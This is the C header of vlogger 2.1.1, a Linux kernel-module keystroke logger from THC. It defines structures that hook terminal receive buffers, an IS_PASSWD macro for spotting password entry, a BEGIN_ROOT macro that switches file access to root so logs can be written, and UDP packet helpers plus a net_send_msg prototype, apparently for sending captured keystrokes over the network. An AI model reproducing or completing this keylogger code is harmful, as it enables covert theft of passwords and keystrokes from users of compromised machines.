/*
 *
 *  Copyright (C) 2002-2003 rd <rd@thc.org>
 *
 *  Please check http://www.thc.org for update
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 */

#ifndef _VLOGGER_H_
#define _VLOGGER_H_

#ifdef __KERNEL__
#ifndef KERNEL_VERSION
#define KERNEL_VERSION(a,b,c) (((a) << 16) + ((b) << 8) + (c))
#endif

#ifdef DEBUG
#define DPRINT(format, args...) printk(MODULE_NAME format, ##args)
#else
#define DPRINT(format, args...)
#endif

#define MODULE_NAME "vlogger "
#define MVERSION "vlogger 2.1.1 - by rd@thc.org\n"

/* get next task */
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,4,20)) && (RED_HAT_LINUX_KERNEL == 1)
#define NEXT_TASK(p) next_task(p)
#else
#define NEXT_TASK(p) p->next_task
#endif

/* toggle character */
#define VK_TOGLE_CHAR 29	// CTRL-] 

#define N_TTY_NAME "tty"
#define N_PTS_NAME "pts"
#define N_SERIAL_NAME "ttyS"
#define MAX_TTY_CON 8
#define MAX_PTS_CON 256
#define MAX_SERIAL_PORTS 64

#define ESC_CHAR 27
#define BACK_SPACE_CHAR1 127	// local
#define BACK_SPACE_CHAR2 8	// remote

#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SZ 12

/*
 * vlogger states
 */
typedef enum
{
	VK_DISABLE = -1,
	VK_NORMAL = 0,
	VK_DUMBMODE = 1,
	VK_SMARTMODE = 2,
} vlogger_mode_t;

#define TTY_NUMBER(tty) MINOR((tty)->device) - (tty)->driver.minor_start \
			+ (tty)->driver.name_base
#define TTY_INDEX(tty) tty->driver.type == \
			TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
			TTY_NUMBER(tty):TTY_NUMBER(tty)
#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
#define TTY_WRITE(tty, buf, count) (*tty->driver.write)(tty, 0, \
							buf, count)
#define TTY_NAME(tty) (tty->driver.type == \
		TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: \
		tty->driver.type == TTY_DRIVER_TYPE_PTY && \
		tty->driver.subtype == PTY_TYPE_SLAVE?N_PTS_NAME:"")

#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

struct tlogger
{
	struct tty_struct *tty;
	char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
	int lastpos;
	int status;
	int pass;
	void (*old_rbuf) (struct tty_struct *, const unsigned char *,
	    char *, int);
};

/* Macros used to get local time */

#define SECS_PER_HOUR   (60 * 60)
#define SECS_PER_DAY    (SECS_PER_HOUR * 24)
#define isleap(year) \
	((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))

struct vtm
{
	int tm_sec;
	int tm_min;
	int tm_hour;
	int tm_mday;
	int tm_mon;
	int tm_year;
};

/* Macros used to write to logfile */
#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define WRITABLE(f) (f->f_op && f->f_op->write)

#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; }

/* buffer related macros */
#define resetbuf(t)		\
{				\
	t->buf[0] = 0;		\
	t->lastpos = 0;		\
}

#define append_c(t, s, n)	\
{				\
	t->lastpos += n;	\
	strncat(t->buf, s, n);	\
}

/* Prototypes */
inline void init_tty(struct tty_struct *, int);

void net_send_msg(struct tty_struct *tty, const char *msg,
    unsigned int msg_len);

/*
 * Ripped from neighbour.c
 */
static inline void
neigh_hh_init(struct neighbour *n, struct dst_entry *dst, u16 protocol)
{
	struct hh_cache *hh = NULL;
	struct net_device *dev = dst->dev;

	for (hh = n->hh; hh; hh = hh->hh_next)
		if (hh->hh_type == protocol)
			break;

	if (!hh && (hh = kmalloc(sizeof(*hh), GFP_ATOMIC)) != NULL) {
		memset(hh, 0, sizeof(struct hh_cache));
		hh->hh_lock = RW_LOCK_UNLOCKED;
		hh->hh_type = protocol;
		atomic_set(&hh->hh_refcnt, 0);
		hh->hh_next = NULL;
		if (dev->hard_header_cache(n, hh)) {
			kfree(hh);
			hh = NULL;
		} else {
			atomic_inc(&hh->hh_refcnt);
			hh->hh_next = n->hh;
			n->hh = hh;
			if (n->nud_state & NUD_CONNECTED)
				hh->hh_output = n->ops->hh_output;
			else
				hh->hh_output = n->ops->output;
		}
	}
	if (hh) {
		atomic_inc(&hh->hh_refcnt);
		dst->hh = hh;
	}
}

/* 
 * Resolve neighbour
 * Modified from neigh_resolve_output
 */
static inline int
neigh_resolve(struct sk_buff *skb)
{
	struct dst_entry *dst = skb->dst;
	struct neighbour *neigh;

	if (!dst || !(neigh = dst->neighbour))
		return -EINVAL;

	__skb_pull(skb, skb->nh.raw - skb->data);

	if (neigh_event_send(neigh, skb) == 0) {
		int err;
		struct net_device *dev = neigh->dev;
		if (dev->hard_header_cache && dst->hh == NULL) {
			write_lock_bh(&neigh->lock);
			if (dst->hh == NULL)
				neigh_hh_init(neigh, dst, dst->ops->protocol);
			err =
			    dev->hard_header(skb, dev, ntohs(skb->protocol),
			    neigh->ha, NULL, skb->len);
			write_unlock_bh(&neigh->lock);
		} else if (dev->hard_header) {
			read_lock_bh(&neigh->lock);
			err =
			    dev->hard_header(skb, dev, ntohs(skb->protocol),
			    neigh->ha, NULL, skb->len);
			read_unlock_bh(&neigh->lock);
		} else	// some interface such as ppp, slip don't have hard_header
			return 0;
		if (err >= 0)
			return 0;
	}

	return -EINVAL;
}

#define MAX_UDP_CHUNK 1460
#define MAX_PRINT_CHUNK (MAX_UDP_CHUNK-HEADER_LEN)

#define MAX_SKB_SIZE (MAX_UDP_CHUNK + sizeof(struct udphdr) + \
			sizeof(struct iphdr) + sizeof(struct ethhdr))

#endif /* __KERNEL__ */

#define SEND_CMD 0x01
#define OFFSET_LEN 4
#define TTYNAME_LEN 8
#define HEADER_LEN (OFFSET_LEN + TTYNAME_LEN + 1)

#endif /* _VLOGGER_H_ */
